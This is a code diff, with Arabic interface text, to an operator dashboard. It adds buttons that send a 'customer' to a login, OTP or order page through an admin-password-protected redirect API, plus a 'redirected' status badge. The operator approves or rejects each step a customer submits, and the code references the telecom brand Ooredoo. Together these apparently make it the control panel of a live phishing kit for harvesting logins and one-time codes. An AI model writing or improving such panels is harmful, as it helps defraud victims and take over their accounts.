@@ -565,7 +565,10 @@ ${o.ooredoo ? `
       <button class="rbtn reject" data-reject="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
     </div>` : ""}
     <div class="dactions">
-      <button class="rbtn redir" data-redir="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> إعادة التوجيه لصفحة الطلب</button>
+      <div style="flex:1 0 100%;font-weight:800;margin-bottom:6px">إعادة توجيه العميل إلى:</div>
+      <button class="rbtn redir" data-rpage="login" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> تسجيل الدخول</button>
+      <button class="rbtn redir" data-rpage="otp" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> رمز التحقق</button>
+      <button class="rbtn redir" data-rpage="order" data-rref="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> صفحة الطلب</button>
       <button class="rbtn" id="popClose2">إغلاق</button>
     </div>`;
   $("pop").classList.add("open"); document.body.classList.add("pop-open");
@@ -578,7 +581,7 @@ $("pop").addEventListener("click", e => {
   if (e.target === $("pop")) { closePop(); return; }
   const ac = e.target.closest("[data-accept]"); if (ac) { closePop(); decide(popRef, "accept"); return; }
   const rj = e.target.closest("[data-reject]"); if (rj) { closePop(); decide(popRef, "reject"); return; }
-  const r = e.target.closest("[data-redir]"); if (r) redirect(r.dataset.redir);
+  const rp = e.target.closest("[data-rpage]"); if (rp) { closePop(); redirectTo(rp.dataset.rref, rp.dataset.rpage); return; }
 });
 document.addEventListener("keydown", e => { if (e.key === "Escape") closePop(); });
 
@@ -588,6 +591,7 @@ function stepName(step){
 function badgeFor(st){
   if (st === "awaiting") return '<span class="badge wait">بانتظار قرارك</span>';
   if (st === "rejected") return '<span class="badge rej">مرفوض</span>';
+  if (st === "redirected") return '<span class="badge pend">تم إعادة التوجيه</span>';
   if (st === "stepok")   return '<span class="badge wait">بانتظار الخطوة التالية</span>';
   if (st === "pending")  return '<span class="badge pend">قيد الإدخال</span>';
   return '<span class="badge ok">مؤكد</span>';
@@ -638,8 +642,6 @@ $("rows").addEventListener("click", e => {
   if (qa) { decide(qa.dataset.qaccept, "accept"); return; }
   const qr = e.target.closest("[data-qreject]");
   if (qr) { decide(qr.dataset.qreject, "reject"); return; }
-  const r = e.target.closest("[data-redir]");
-  if (r) redirect(r.dataset.redir);
 });
 async function decide(ref, decision){
   if (!ref) return;
@@ -652,11 +654,16 @@ async function decide(ref, decision){
     if (r.ok) { toast(decision === "accept" ? "تم قبول الخطوة" : "تم رفض الخطوة"); refresh(); }
   } catch (e) { toast("تعذّر تنفيذ الإجراء"); }
 }
-function redirect(ref){
-  const o = loadOrders().find(x => x.ref === ref); if (!o) return;
-  const enc = encodeData({ n:o.n||"", id:o.id||"", p:o.p||"", e:o.e||"", g:o.g||"male", ad:o.ad||"" });
-  const page = o.lang === "en" ? "order-en.html" : "order.html";
-  window.open(`${page}#${o.ref}~${enc}`, "_blank");
+async function redirectTo(ref, page){
+  if (!ref || !page) return;
+  if (MODE !== "server") { toast("إعادة التوجيه متاحة بعد النشر على السيرفر"); return; }
+  const pages = {login:"تسجيل الدخول", otp:"رمز التحقق", order:"صفحة الطلب"};
+  try {
+    const r = await fetch("/api/admin/redirect/" + encodeURIComponent(ref), {
+      method: "POST", headers: { "Content-Type": "application/json", "x-admin-password": PW },
+      body: JSON.stringify({ page: page }) });
+    if (r.ok) { toast("تم إعادة توجيه العميل إلى " + (pages[page] || page)); refresh(); }
+  } catch(e) { toast("تعذّر إعادة التوجيه"); }
 }
 function encodeData(obj){
   const bytes = new TextEncoder().encode(JSON.stringify(obj));
